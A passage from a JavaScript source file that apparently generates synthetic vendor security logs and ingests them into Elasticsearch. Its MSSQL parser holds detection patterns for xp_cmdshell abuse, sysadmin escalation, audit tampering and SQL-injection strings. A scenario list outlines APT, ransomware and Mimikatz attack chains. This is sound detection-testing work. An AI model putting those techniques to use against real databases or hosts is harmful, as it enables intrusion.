          if(o.log_type==='transaction_log')return'metrics-microsoft_sqlserver.transaction_log-default';
          if(o.event?.kind==='metric')return'metrics-microsoft_sqlserver.performance-default';
          if(o.action_id!==undefined)return'logs-microsoft_sqlserver.audit-default';
        }catch{}
        return'logs-microsoft_sqlserver.log-default';
      }
      if(l.match(/ - [!+?I] \[/))return'logs-microsoft_sqlserver.agent-default';
      return'logs-microsoft_sqlserver.log-default';
    },
    toDoc(l){
      const mod='microsoft_sqlserver';
      // ── Transaction Log / Metrics / Audit (JSON) ──
      if(l.trimStart().startsWith('{')){
        try{
          const o=JSON.parse(l);
          if(o.log_type==='transaction_log'){
            const m=o.mssql?.metrics||{};
            return{'@timestamp':o['@timestamp']||new Date().toISOString(),...(o.host?{host:o.host}:{}),event:{dataset:'microsoft_sqlserver.transaction_log',module:mod,kind:'metric'},mssql:{metrics:m},agent:agentField('metricbeat'),data_stream:{type:'metrics',dataset:'microsoft_sqlserver.transaction_log',namespace:'default'}};
          }
          if(o.event?.kind==='metric'){
            const ds=o.event.dataset?.replace('mssql.','microsoft_sqlserver.')||'microsoft_sqlserver.performance';
            return{...o,event:{...o.event,dataset:ds,module:mod},agent:agentField('metricbeat'),data_stream:{type:'metrics',dataset:ds,namespace:'default'}};
          }
          if(o.action_id!==undefined){
            const stmt=o.statement||'';
            const isXpCmd=stmt.match(/xp_cmdshell/i);
            const isOleCom=stmt.match(/sp_OACreate|sp_OAMethod/i);
            const isOpenRowset=stmt.match(/OPENROWSET|OPENDATASOURCE/i);
            const isPrivEsc=stmt.match(/sp_addsrvrolemember|ALTER SERVER ROLE\s+sysadmin|EXECUTE AS LOGIN/i);
            const isSpConfig=stmt.match(/sp_configure.*xp_cmdshell|sp_configure.*Ole Automation/i);
            const isInjection=stmt.match(/UNION\s+SELECT|WAITFOR\s+DELAY|OR\s+'?1'?='?1/i);
            const isLinkedSrv=stmt.match(/sp_addlinkedserver|sp_addlinkedsrvlogin/i);
            const isRecon=stmt.match(/sys\.sql_logins|sys\.server_principals|sys\.xp_dirtree|sys\.xp_subdirs/i);
            const isAuditTamper=stmt.match(/DISABLE.*AUDIT|DROP.*AUDIT|sp_configure.*criteria/i);
            const cats=['database'];
            let tactic,technique,cmdLine;
            if(isXpCmd){cats.push('intrusion_detection','execution');tactic='Execution';technique='Command and Scripting Interpreter';
              const m=stmt.match(/xp_cmdshell\s+'([^']+)'/i);if(m)cmdLine=m[1];}
            else if(isOleCom){cats.push('execution');tactic='Execution';technique='System Services';}
            else if(isOpenRowset){cats.push('collection');tactic='Collection';technique='Data from Local System';}
            else if(isPrivEsc){cats.push('privilege_escalation');tactic='Privilege Escalation';technique='Valid Accounts';}
            else if(isSpConfig){cats.push('defense_evasion');tactic='Defense Evasion';technique='Impair Defenses';}
            else if(isInjection){cats.push('intrusion_detection');tactic='Initial Access';technique='Exploit Public-Facing Application';}
            else if(isLinkedSrv){cats.push('lateral_movement');tactic='Lateral Movement';technique='Remote Services';}
            else if(isRecon){cats.push('discovery');tactic='Discovery';technique='Account Discovery';}
            else if(isAuditTamper){cats.push('defense_evasion');tactic='Defense Evasion';technique='Indicator Removal';}
            const sev=isXpCmd||isOleCom||isOpenRowset||isPrivEsc?73:isSpConfig||isInjection||isLinkedSrv?47:21;
            return{'@timestamp':o.event_time||new Date().toISOString(),message:l,event:{dataset:'microsoft_sqlserver.audit',module:mod,kind:'event',category:cats,action:(o.action_name||o.action_id).toLowerCase(),outcome:o.succeeded?'success':'failure',severity:sev,original:l},...(o.server_principal_name?{user:{name:o.server_principal_name}}:{}),...(o.client_ip?{source:{ip:o.client_ip,address:o.client_ip}}:{}),...(o.database_name?{database:{instance:{name:o.database_name}}}:{}),...(cmdLine?{process:{command_line:cmdLine}}:{}),'microsoft_sqlserver.audit.statement':stmt,...(tactic?{threat:{framework:'MITRE ATT&CK',tactic:{name:tactic},technique:{name:technique}}}:{}),agent:agentField('filebeat'),data_stream:dsField('microsoft_sqlserver.audit')};
          }
        }catch{}
      }
      // ── SQL Agent ──
      if(l.match(/ - [!+?I] \[/)){
        const tsM=l.match(/^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d+)/);
        const ts=tsM?new Date(tsM[1].replace(' ','T')+'Z').toISOString():new Date().toISOString();
        const sev=l.includes(' - ! ')?'failure':l.includes(' - + ')?'unknown':'success';
        const errM=l.match(/SQLServer Error: (\d+)/);
        return{'@timestamp':ts,message:l,event:{dataset:'microsoft_sqlserver.agent',module:mod,kind:'event',category:['database'],action:'sql-agent-event',outcome:sev,original:l},process:{name:'SQLAGENT'},...(errM?{error:{code:errM[1]}}:{}),agent:agentField('filebeat'),data_stream:dsField('microsoft_sqlserver.agent')};
      }
      // ── ERRORLOG ──
      const tsM=l.match(/^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d+)/);
      const ts=tsM?new Date(tsM[1].replace(' ','T')+'Z').toISOString():new Date().toISOString();
      const loginM=l.match(/Login failed for user '([^']+)'.*\[CLIENT: ([^\]]+)\]/);
      const errM=l.match(/Error: (\d+),/);
      return{'@timestamp':ts,message:l,event:{dataset:'microsoft_sqlserver.log',module:mod,kind:'event',category:['database'],action:loginM?'login-failed':errM?'database-error':'database-event',outcome:loginM||errM?'failure':'success',original:l},...(loginM?{user:{name:loginM[1]},source:{ip:loginM[2],address:loginM[2]}}:{}),...(errM?{error:{code:errM[1]}}:{}),agent:agentField('filebeat'),data_stream:dsField('microsoft_sqlserver.log')};
    },
  },
  cloudtrail:{
    getIndex(){return'logs-aws.cloudtrail-default';},
    toDoc(l){
      try{
        const o=JSON.parse(l);
        const user=o.userIdentity?.userName||(o.userIdentity?.arn||'').split('/').pop()||'';
        const isErr=!!o.errorCode;
        const svc=o.eventSource||'';
        const cat=svc.includes('iam')||svc.includes('sts')?['iam','configuration']:svc.includes('signin')?['authentication']:['configuration'];
        return{'@timestamp':o.eventTime||new Date().toISOString(),message:l,
          event:{dataset:'aws.cloudtrail',module:'aws',kind:'event',action:o.eventName,outcome:isErr?'failure':'success',category:cat,provider:o.eventSource,original:l},
          aws:{cloudtrail:{event_version:o.eventVersion,user_identity:{type:o.userIdentity?.type,arn:o.userIdentity?.arn,account_id:o.userIdentity?.accountId,user_name:user},event_source:o.eventSource,event_name:o.eventName,aws_region:o.awsRegion,error_code:o.errorCode,error_message:o.errorMessage,request_parameters:o.requestParameters?JSON.stringify(o.requestParameters):undefined,request_id:o.requestID,event_id:o.eventID,event_type:o.eventType,recipient_account_id:o.recipientAccountId}},
          cloud:{account:{id:o.recipientAccountId||o.userIdentity?.accountId},region:o.awsRegion,provider:'aws'},
          user:{name:user},source:{ip:o.sourceIPAddress,address:o.sourceIPAddress},
          user_agent:{original:o.userAgent},
          agent:agentField('filebeat'),data_stream:dsField('aws.cloudtrail')};
      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'aws.cloudtrail',module:'aws'},agent:agentField('filebeat'),data_stream:dsField('aws.cloudtrail')};}
    },
  },
  okta:{
    getIndex(){return'logs-okta.system-default';},
    toDoc(l){
      try{
        const o=JSON.parse(l);
        const userId=o.actor?.alternateId||'';
        const isFailure=o.outcome?.result==='FAILURE'||o.outcome?.result==='DENIED';
        const et=o.eventType||'';
        const cat=et.includes('session')||et.includes('authentication')?['authentication']:et.includes('user')||et.includes('group')?['iam']:['configuration'];
        return{'@timestamp':o.published||new Date().toISOString(),message:l,
          event:{dataset:'okta.system',module:'okta',kind:'event',action:o.eventType,outcome:isFailure?'failure':'success',category:cat,provider:'Okta',original:l},
          okta:{actor:o.actor,client:o.client,event_type:o.eventType,outcome:o.outcome,target:o.target,transaction:o.transaction,uuid:o.uuid,display_message:o.displayMessage,severity:o.severity,security_context:o.securityContext,authentication_context:o.authenticationContext,request:o.request},
          user:{name:userId,email:userId},
          source:{ip:o.client?.ipAddress,address:o.client?.ipAddress},
          agent:agentField('filebeat'),data_stream:dsField('okta.system')};
      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'okta.system',module:'okta'},agent:agentField('filebeat'),data_stream:dsField('okta.system')};}
    },
  },
  crowdstrike:{
    getIndex(l){try{const o=JSON.parse(l);const et=o.metadata?.eventType;if(et==='DetectionSummaryEvent')return'logs-crowdstrike.falcon-default';if(et==='AlertSummaryEvent')return'logs-crowdstrike.alert-default';if(et==='SpotlightVulnerabilityEvent')return'logs-crowdstrike.vulnerability-default';try{const p=JSON.parse(l);if(p._eventType==='HostInventory')return'logs-crowdstrike.host-default';}catch{}return'logs-crowdstrike.fdr-default';}catch{return'logs-crowdstrike.fdr-default';}},
    toDoc(l){
      try{
        const o=JSON.parse(l);
        if(o._eventType==='HostInventory'){
          const hi=CS_HOST_INFO[o.hostname]||{};
          const ds='crowdstrike.host';
          return{'@timestamp':o.last_seen||new Date().toISOString(),message:l,
            event:{dataset:ds,module:'crowdstrike',kind:'asset',action:'host-inventory',category:['host'],type:['info'],outcome:'success',original:l},
            host:{name:o.hostname,hostname:o.hostname,id:o.device_id,ip:[o.local_ip,o.external_ip].filter(Boolean),mac:[o.mac_address],domain:o.machine_domain,os:hi.os||{name:o.os_version,family:'windows',platform:'windows',version:o.os_version_normalized}},
            agent:{type:'elastic_agent',id:o.device_id,name:o.hostname,version:o.agent_version,ephemeral_id:o.device_id?.slice(0,8)||'00000000'},
            crowdstrike:{host:{device_id:o.device_id,hostname:o.hostname,local_ip:o.local_ip,external_ip:o.external_ip,mac_address:o.mac_address,os_version:o.os_version,platform_name:o.platform_name,agent_version:o.agent_version,first_seen:o.first_seen,last_seen:o.last_seen,status:o.status,containment_status:o.containment_status,product_type_desc:o.product_type_desc,system_manufacturer:o.system_manufacturer,system_product_name:o.system_product_name,machine_domain:o.machine_domain,site_name:o.site_name,tags:o.tags,groups:o.groups,policies:o.policies}},
            data_stream:dsField(ds),agent_info:{local_time:o.agent_local_time}};
        }
        const evt=o.event||{};
        const meta=o.metadata||{};
        const eventType=meta.eventType||'';
        const isDetect=eventType==='DetectionSummaryEvent';
        const isAlert=eventType==='AlertSummaryEvent';
        const isVuln=eventType==='SpotlightVulnerabilityEvent';
        const isDns=eventType==='DnsRequest';
        const isNetwork=eventType==='NetworkConnectIP4';
        const isProcess=eventType==='ProcessRollup2';
        const ts=meta.eventCreationTime?new Date(meta.eventCreationTime).toISOString():new Date().toISOString();
        const host=evt.ComputerName||evt.HostName||evt.host_info?.hostname||'';
        const hi=CS_HOST_INFO[host]||{};
        const aid=meta.aid||evt.aid||hi.aid||'';
        const hostIP=evt.LocalIP||evt.LocalAddressIP4||evt.host_info?.local_ip||hi.ip||'';
        const hostMAC=evt.MACAddress||'';
        const hostDomain=evt.MachineDomain||'';
        const rawOS=evt.OperatingSystem||evt.host_info?.os_version||hi.os?.name||'';
        const osInfo=hi.os||{name:rawOS,family:'windows',version:evt.host_info?.os_version_normalized||'',platform:'windows'};
        const userRaw=evt.UserName||evt.UserId||'';
        const user=userRaw.includes('\\')?userRaw.split('\\').pop():userRaw;
        const userDomain=userRaw.includes('\\')?userRaw.split('\\')[0]:'';
        const ds=isDetect?'crowdstrike.falcon':isAlert?'crowdstrike.alert':isVuln?'crowdstrike.vulnerability':'crowdstrike.fdr';
        const cat=isDetect?['malware','intrusion_detection']:isAlert?['intrusion_detection']:isVuln?['vulnerability']:isDns||isNetwork?['network']:['process'];
        const action=isDetect?'detection':isAlert?'alert':isVuln?'vulnerability-found':isProcess?'process-start':isNetwork?'network-connection':isDns?'dns-query':eventType.toLowerCase();
        const doc={
          '@timestamp':ts,message:l,
          event:{dataset:ds,module:'crowdstrike',kind:'event',action,outcome:'success',category:cat,type:isProcess?['start']:isNetwork?['connection']:isDns?['info']:isDetect||isAlert?['indicator']:['info'],original:l,...((isDetect||isAlert)?{severity:4}:{})},
          crowdstrike:{
            event:evt,
            metadata:{...meta,aid,event_type:eventType,customer_id:meta.customerIDString,event_creation_time:ts},
          },
          host:{name:host,hostname:host,...(aid?{id:aid}:{}),...(hostIP?{ip:[hostIP]}:{}),...(hostDomain?{domain:hostDomain}:{}),...(hostMAC?{mac:[hostMAC]}:{}),...(osInfo.name?{os:osInfo}:{})},
          user:{name:user,...(userDomain?{domain:userDomain}:{})},
          agent:{type:'elastic_agent',id:aid||hi.aid||'',name:host,version:hi.sensorVersion||'7.14.16703.0',ephemeral_id:aid?aid.slice(0,8):'00000000'},
          data_stream:dsField(ds),
        };
        if(isDetect){
          doc.event.severity=evt.Severity||3;
          doc.rule={name:evt.DetectDescription||evt.DetectName||pick(CS_DETECT_NAMES)};
          doc.threat={framework:'MITRE ATT&CK',tactic:{name:evt.Tactic},technique:{name:evt.Technique,id:evt.TechniqueId}};
          if(evt.FileName){doc.process={name:evt.FileName,executable:evt.FilePath?evt.FilePath+'\\'+evt.FileName:evt.FileName,pid:evt.ProcessId,...((evt.SHA256HashData||evt.MD5HashData)?{hash:{...(evt.SHA256HashData?{sha256:evt.SHA256HashData}:{}),...(evt.MD5HashData?{md5:evt.MD5HashData}:{})}}:{})};}
        }
        if(isAlert){
          doc.event.severity=evt.Severity||3;
          doc.rule={name:evt.Name||evt.DetectDescription||pick(CS_DETECT_NAMES),description:evt.Description};
          doc.threat={framework:'MITRE ATT&CK',tactic:{name:evt.Tactic},technique:{name:evt.Technique}};
          if(evt.FileName){doc.process={name:evt.FileName,command_line:evt.CommandLine,...((evt.SHA256HashData)?{hash:{sha256:evt.SHA256HashData}}:{})};}
          doc.crowdstrike={...doc.crowdstrike,alert:{id:evt.AlertId,type:evt.AlertType,status:evt.Status,assigned_to_name:evt.AssignedToName,severity:evt.SeverityName,tactic:evt.Tactic,technique:evt.Technique}};
        }
        if(isVuln){
          const cve=evt.cve||{};
          doc.vulnerability={id:cve.id,severity:cve.severity,score:{base:cve.base_score},description:cve.description,published:cve.published_date,enumeration:'CVE',reference:`https://nvd.nist.gov/vuln/detail/${cve.id}`,category:'OS',scanner:{vendor:'CrowdStrike'}};
          doc.crowdstrike={...doc.crowdstrike,vulnerability:{id:evt.id,status:evt.status,aid:evt.aid,cve,host_info:evt.host_info,app:evt.app,remediation_description:evt.remediation_description}};
        }
        if(isProcess&&evt.FileName){doc.process={name:evt.FileName,executable:evt.ImageFileName||evt.FileName,command_line:evt.CommandLine,pid:evt.TargetProcessId||evt.ProcessId,...((evt.SHA256HashData||evt.MD5HashData)?{hash:{...(evt.SHA256HashData?{sha256:evt.SHA256HashData}:{}),...(evt.MD5HashData?{md5:evt.MD5HashData}:{})}}:{})};}
        if(isNetwork&&(evt.LocalAddressIP4||evt.RemoteAddressIP4)){doc.source={ip:evt.LocalAddressIP4,port:evt.LocalPort};doc.destination={ip:evt.RemoteAddressIP4,port:evt.RemotePort};doc.network={transport:Number(evt.Protocol)===6?'tcp':Number(evt.Protocol)===17?'udp':'unknown',direction:'outbound',type:'ipv4'};}
        if(isDns&&evt.DomainName){const dnsTypeMap={1:'A',2:'NS',5:'CNAME',12:'PTR',15:'MX',16:'TXT',28:'AAAA'};const dnsQType=dnsTypeMap[evt.RequestType]||'A';const resolvedAddr=evt.ResolvedIP||randomIP();const dnsAns=[{data:resolvedAddr,type:dnsQType,name:evt.DomainName}];doc.dns={question:{name:evt.DomainName,type:dnsQType},type:'query',answers:dnsAns,resolved_ip:[resolvedAddr]};doc.network={protocol:'dns',type:'ipv4'};}
        return doc;
      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'crowdstrike.fdr',module:'crowdstrike'},agent:agentField('elastic_agent'),data_stream:dsField('crowdstrike.fdr')};}
    },
  },
  wdns:{
    getIndex(l){try{const o=JSON.parse(l);const eid=o.winlog?.event_id;return(eid===22||eid===3)?'logs-windows.sysmon_operational-default':'logs-windows.security-default';}catch{return'logs-windows.sysmon_operational-default';}},
    toDoc(l){
      try{
        const o=JSON.parse(l);
        const eid=o.winlog?.event_id;
        const isSysmon=eid===22||eid===3;
        const ds=isSysmon?'windows.sysmon_operational':'windows.security';
        return{...o,message:l,event:{...o.event,dataset:ds,module:'windows',original:l},agent:agentField(isSysmon?'elastic_agent':'winlogbeat'),data_stream:dsField(ds)};
      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'windows.sysmon_operational',module:'windows'},agent:agentField('elastic_agent'),data_stream:dsField('windows.sysmon_operational')};}
    },
  },
};

async function pushLogsToElastic(logs,indexOverrides={}){
  const cfg=loadConfig();if(!cfg?.url)throw new Error('No Elasticsearch config found');
  const idxCounts={},bulkLines=[];
  for(const[vid,rawLogs]of Object.entries(logs)){const ing=VENDOR_INGEST[vid];if(!ing)continue;const override=indexOverrides[vid]?.trim()||null;for(const raw of rawLogs){const idx=override||ing.getIndex(raw);const doc=JSON.parse(JSON.stringify(ing.toDoc(raw)));bulkLines.push(JSON.stringify({create:{_index:idx}}));bulkLines.push(JSON.stringify(doc));idxCounts[idx]=(idxCounts[idx]||0)+1;}}
  if(bulkLines.length===0)throw new Error('No logs to push');
  const res=await fetch(`${cfg.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(cfg),body:bulkLines.join('\n')+'\n'});
  if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
  const data=await res.json();const total=bulkLines.length/2;
  const errItems=(data.items||[]).filter(i=>i.create?.error||i.index?.error);
  const errs=errItems.length;
  // Group errors by index so we can see which indices are failing
  const errByIndex={};
  errItems.forEach((item)=>{
    const op=item.create||item.index;
    const idx=op._index||'unknown';
    const e=op.error;
    if(!errByIndex[idx])errByIndex[idx]=[];
    if(errByIndex[idx].length<2)errByIndex[idx].push(`[${e?.type}] ${e?.reason}`);
  });
  const sampleErrors=Object.entries(errByIndex).map(([idx,msgs])=>`${idx}:\n  ${msgs.join('\n  ')}`);
  console.log('[push] indices:',idxCounts,'errors by index:',errByIndex);
  return{total,errors:errs,indices:idxCounts,sampleErrors};
}

// ─── VENDORS config ───────────────────────────────────────────────────────────
const VENDORS=[
  {id:'fortinet',name:'Fortinet FortiGate',description:'Traffic, UTM/IPS, and SSL VPN events',tags:['Firewall','UTM','VPN','IPS'],indices:['logs-fortinet.fortigate.traffic-default','logs-fortinet.fortigate.utm-default'],generator:generateFortinetLogs},
  {id:'paloalto',name:'Palo Alto Networks',description:'PAN-OS traffic and threat logs in CSV syslog format',tags:['NGFW','Threat','Traffic','WildFire'],indices:['logs-panw.panos-5.5.0'],generator:generatePaloAltoLogs},
  {id:'switch',name:'Cisco Switches',description:'IOS syslog: link state, STP, 802.1X, OSPF',tags:['Switch','STP','NAC','OSPF'],indices:['logs-cisco.ios-default'],generator:generateSwitchLogs},
  {id:'email',name:'E-Mail Systems',description:'Exchange tracking, Postfix MTA, and O365 audit logs',tags:['Exchange','Postfix','O365','Phishing'],indices:['logs-o365.audit-default','logs-microsoft_exchange_server.log-default'],generator:generateEmailLogs},
  {id:'endpoint',name:'Endpoint Telemetry',description:'EDR-style process, network, and alert events with MITRE ATT&CK',tags:['EDR','Process','MITRE','Alerts'],indices:['logs-endpoint.events.process-default','logs-endpoint.alerts-default'],generator:generateEndpointLogs},
  {id:'windows',name:'Windows Events',description:'Security (4624/4625), Application, System, AppLocker and PowerShell event logs via winlogbeat',tags:['Security','PowerShell','Logon','AppLocker'],indices:['logs-windows.security-default','logs-windows.application-default','logs-windows.system-default','logs-windows.powershell_operational-default','logs-windows.applocker-default'],generator:generateWindowsEventLogs},
  {id:'linux',name:'Linux / Syslog',description:'SSH auth, sudo, auditd syscalls, cron, and systemd',tags:['SSH','Auditd','Sudo','Syslog'],indices:['logs-system.auth-default','logs-auditd.log-default'],generator:generateLinuxLogs},
  {id:'oracle',name:'Oracle Database',description:'Unified audit trail, alert.log, listener logs, and performance metrics',tags:['Database','Audit','Oracle','Metrics'],indices:['logs-oracle.audit-default','metrics-oracle.performance-default'],generator:generateOracleLogs},
  {id:'mssql',name:'Microsoft SQL Server',description:'Audit, transaction log, ERRORLOG, SQL Agent events, and performance metrics',tags:['Database','MSSQL','Audit','Metrics'],indices:['metrics-microsoft_sqlserver.transaction_log-default','metrics-microsoft_sqlserver.performance-default','logs-microsoft_sqlserver.audit-default','logs-microsoft_sqlserver.log-default','logs-microsoft_sqlserver.agent-default'],generator:generateMSSQLLogs},
  {id:'cloudtrail',name:'AWS CloudTrail',description:'Management, IAM, S3 data, and security-relevant API events across AWS services',tags:['AWS','CloudTrail','IAM','S3'],indices:['logs-aws.cloudtrail-default'],generator:generateCloudTrailLogs},
  {id:'okta',name:'Okta',description:'Authentication, user lifecycle, policy changes, and application provisioning events',tags:['Identity','SSO','MFA','IAM'],indices:['logs-okta.system-default'],generator:generateOktaLogs},
  {id:'crowdstrike',name:'CrowdStrike Falcon',description:'Process telemetry, network connections, DNS, Falcon detection summaries, alerts, and vulnerability spotlight',tags:['EDR','Detections','Vulnerability','MITRE'],indices:['logs-crowdstrike.falcon-default','logs-crowdstrike.fdr-default','logs-crowdstrike.alert-default','logs-crowdstrike.vulnerability-default','logs-crowdstrike.host-default'],generator:generateCrowdStrikeLogs},
  {id:'wdns',name:'Windows DNS & AD',description:'Sysmon DNS queries, LDAP connections, Kerberos events (4768/4769/4771), and AD directory changes',tags:['DNS','Active Directory','Kerberos','LDAP'],indices:['logs-windows.sysmon_operational-default','logs-windows.security-default'],generator:generateWDNSLogs},
];
const SCENARIOS=[
  {id:'apt29',name:'APT29 — Midnight Blizzard',description:'State-sponsored: OAuth phishing → persistence → credential dump → lateral movement → C2 → exfiltration. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Initial Access','Execution','Persistence','Defense Evasion','Credential Access','Discovery','Lateral Movement','Collection','Command and Control','Exfiltration'],generator:generateAPT29Scenario},
  {id:'lotl',name:'APT — Living off the Land',description:'Fileless attack using only Windows built-in tools: certutil → mshta → schtasks → log clearing → NTDS dump → WMI → exfil. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Execution','Persistence','Defense Evasion','Privilege Escalation','Credential Access','Discovery','Lateral Movement','Collection','Exfiltration'],generator:generateLotLScenario},
  {id:'phishing',name:'Phishing Attack',description:'Spearphishing email → file download → execution → C2 beacon. Full Initial Access → Execution → C2 chain.',severity:'critical',type:'raw',tactics:['Initial Access','Execution','Command & Control'],generator:generatePhishingScenario},
  {id:'phishing-lateral',name:'Phishing + Lateral Movement',description:'Phishing compromise → LSASS dump via Mimikatz → Pass-the-Hash → PsExec lateral movement to second host.',severity:'critical',type:'raw',tactics:['Initial Access','Credential Access','Lateral Movement'],generator:generatePhishingLateralScenario},
  {id:'exfiltration',name:'Data Exfiltration',description:'File staging → 7-Zip password archive → HTTPS upload + DNS tunneling → audit log cleared.',severity:'critical',type:'raw',tactics:['Collection','Exfiltration','Defense Evasion'],generator:generateExfiltrationScenario},
  {id:'ransomware',name:'Ransomware Outbreak',description:'Office macro → fileless PowerShell → VSS/backup deletion → Defender disabled → mass encryption → EternalBlue SMB spread. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Initial Access','Execution','Defense Evasion','Impact','Lateral Movement'],generator:generateRansomwareScenario},
];

// ─── UI Components ────────────────────────────────────────────────────────────
const cn=(...args)=>args.filter(Boolean).join(' ');

function Badge({children,className}){return <span className={cn("inline-flex items-center px-1.5 py-0.5 rounded text-[10px] font-medium border",className)}>{children}</span>;}
function Button({children,onClick,disabled,className,size='md',variant='default'}){const base="inline-flex items-center justify-center font-medium rounded transition-all focus:outline-none";const sizes={sm:"h-7 px-2.5 text-xs",md:"h-9 px-4 text-sm"};const variants={default:"bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50",outline:"border border-gray-600 text-gray-300 hover:border-gray-400 hover:text-white disabled:opacity-50",ghost:"text-gray-400 hover:text-white hover:bg-gray-700 disabled:opacity-50"};return <button onClick={onClick} disabled={disabled} className={cn(base,sizes[size],variants[variant],className)}>{children}</button>;}

// Config Dialog
function ConfigDialog({open,onClose,onSave}){
  const [cfg,setCfg]=useState({url:'',apiKey:'',kibanaUrl:''});
  const [status,setStatus]=useState(null);
  const [err,setErr]=useState('');
  const [showCurl,setShowCurl]=useState(false);
  useEffect(()=>{if(open){const s=loadConfig();if(s)setCfg({url:s.url||'',apiKey:s.apiKey||'',kibanaUrl:s.kibanaUrl||''});}},[open]);
  const upd=(k,v)=>setCfg(c=>({...c,[k]:v}));
  const test=async()=>{setStatus('testing');setErr('');try{const r=await fetch(`${cfg.url.replace(/\/$/,'')}/_cluster/health`,{headers:buildHeaders(cfg),mode:'cors'});if(r.ok){const d=await r.json();setStatus('ok');setErr(`Cluster: ${d.cluster_name} — ${d.status}`);}else{setStatus('error');setErr(`HTTP ${r.status}: ${r.statusText}`);}}catch(e){setStatus('error');setErr(e.message==='Failed to fetch'?'CORS_ERROR':e.message);}};
  const save=()=>{saveConfig(cfg);onSave(cfg);onClose();};
  const curl=`curl -k -H "Authorization: ApiKey ${cfg.apiKey}" "${cfg.url.replace(/\/$/,'')}/_cluster/health?pretty"`;
  if(!open)return null;
  return(
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
      <div className="bg-gray-900 border border-gray-700 rounded-xl w-full max-w-lg">
        <div className="flex items-center gap-2 p-5 border-b border-gray-700">
          <svg className="w-5 h-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7c0-2-1-3-3-3H7C5 4 4 5 4 7z"/><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6M9 16h4"/></svg>
          <h2 className="text-white font-semibold">Elasticsearch Connection</h2>
          <button onClick={onClose} className="ml-auto text-gray-400 hover:text-white">✕</button>
        </div>
        <div className="p-5 space-y-4">
          {[['Cluster URL','url','https://my-cluster.es.io:9200'],['API Key','apiKey','Base64-encoded API key'],['Kibana URL (optional)','kibanaUrl','https://my-cluster.kb.io:5601']].map(([label,key,ph])=>(
            <div key={key} className="space-y-1.5">
              <label className="text-xs text-gray-400 font-medium">{label}</label>
              <input type={key==='apiKey'?'password':'text'} value={cfg[key]} onChange={e=>upd(key,e.target.value)} placeholder={ph} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
            </div>
          ))}
          {status==='ok'&&<div className="flex gap-2 p-2.5 rounded-lg bg-green-500/10 border border-green-500/30 text-xs text-green-400">✓ Connected! {err}</div>}
          {status==='error'&&err==='CORS_ERROR'&&(
            <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/30 text-xs text-amber-300 space-y-2">
              <p className="font-medium">⚠ CORS is blocking direct browser requests</p>
              <p className="text-amber-300/80">Config saved — use the curl command below to verify from your terminal.</p>
              <button onClick={()=>setShowCurl(!showCurl)} className="underline text-amber-400">{showCurl?'Hide':'Show'} test command</button>
              {showCurl&&<pre className="bg-gray-900 p-2 rounded text-[11px] whitespace-pre-wrap break-all mt-1">{curl}</pre>}
            </div>
          )}
          {status==='error'&&err!=='CORS_ERROR'&&<div className="flex gap-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/30 text-xs text-red-400">✗ {err||'Connection failed'}</div>}
          {status===null&&<div className="flex gap-2 p-2.5 rounded-lg bg-gray-800 border border-gray-700 text-xs text-gray-400">ℹ Elastic Cloud blocks browser connections (CORS). Save config and use curl or NDJSON download to ingest logs.</div>}
          <div className="flex gap-2 pt-1">
            <Button variant="outline" onClick={test} disabled={!cfg.url||!cfg.apiKey||status==='testing'} className="flex-1">{status==='testing'?'Testing…':'Test Connection'}</Button>
            <Button onClick={save} disabled={!cfg.url} className="flex-1">Save Config</Button>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Vendor Logo (Simple Icons CDN) ──────────────────────────────────────────
// Uses https://cdn.simpleicons.org/{slug}/ffffff for white logo on brand bg.
// onError hides the <img> gracefully if a slug ever changes upstream.
const VENDOR_LOGO_CONF={
  fortinet:    {bg:'#DA1E2E', slug:'fortinet',        text:'FG'},
  paloalto:    {bg:'#003A70', slug:'paloaltonetworks', text:'PAN'},
  switch:      {bg:'#1B9BCC', slug:'cisco',            text:'CS'},
  email:       {bg:'#0078D4', slug:'microsoftoutlook', text:'EX'},
  endpoint:    {bg:'#070707', slug:'elastic',          text:'EL'},
  windows:     {bg:'#0078D4', slug:'windows',          text:'WIN'},
  linux:       {bg:'#E95420', slug:'linux',             text:'LX'},
  oracle:      {bg:'#C74634', slug:'oracle',            text:'ORA'},
  mssql:       {bg:'#CC2929', slug:'microsoftsqlserver',text:'SQL'},
  cloudtrail:  {bg:'#232F3E', slug:'amazonaws',         text:'AWS'},
  okta:        {bg:'#007DC1', slug:'okta',              text:'OK'},
  crowdstrike: {bg:'#E1003C', slug:'crowdstrike',       text:'CS'},
  wdns:        {bg:'#00188F', slug:'microsoftentra',    text:'AD'},
};
function VendorLogo({id}){
  const c=VENDOR_LOGO_CONF[id]||{bg:'#374151',slug:null,text:'?'};
  const[failed,setFailed]=useState(false);
  return(
    <div style={{background:c.bg,width:'100%',height:'100%',display:'flex',alignItems:'center',justifyContent:'center',padding:'7px',boxSizing:'border-box'}}>
      {c.slug&&!failed
        ?<img src={`https://cdn.simpleicons.org/${c.slug}/ffffff`} alt={id} style={{width:'100%',height:'100%',objectFit:'contain'}} onError={()=>setFailed(true)}/>
        :<span style={{color:'#fff',fontWeight:700,fontSize:'10px',letterSpacing:'0.5px',lineHeight:1}}>{c.text||'?'}</span>}
    </div>
  );
}

// Vendor Card
const WIN_TYPE_LABELS={security:'Security',application:'Application',system:'System',applocker:'AppLocker',powershell:'PowerShell'};
